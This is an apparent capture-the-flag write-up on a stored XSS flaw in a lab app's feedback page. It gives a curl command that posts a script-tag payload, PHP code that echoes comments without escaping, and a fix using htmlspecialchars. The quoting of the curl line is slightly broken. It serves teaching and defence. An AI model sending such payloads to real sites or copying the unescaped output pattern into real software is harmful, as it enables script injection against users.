# Stored XSS in Feedback page

## 📖 Vulnerability Explanation
The feedback page stores comments in a database, but the application does not sanitize the input either when storing or when displaying the comments. This leads to the possibility of injecting HTML code.

## ⚙️ Exploitation Process
By sending a script tag we can trigger the XSS and get the flag.

- The following command sends the payload using curl:

```
curl -s -X POST -d 'txtName=</td><script>alert(42)</script>&mtxtMessage=a&btnSign=' 'http://localhost:9090/index.php?page=feedback | grep flag'
```

## 🔧 Fix
The server should sanitize the comments at display time to protect against injections.

## ☝️🤓 Advanced explanation
The following code showcases how the XSS works in the server:

```
<?php
// Query the comment from db
$comment = getCommentFromDatabase();

// Display comment with no sanitization, risk of XSS
echo $comment;
?>
```

This code snippet shows how to fix the issue:

```
<?php
// Query the comment from db
$comment = getCommentFromDatabase();

// Escape special HTML characters to protect against XSS
echo htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
?>
```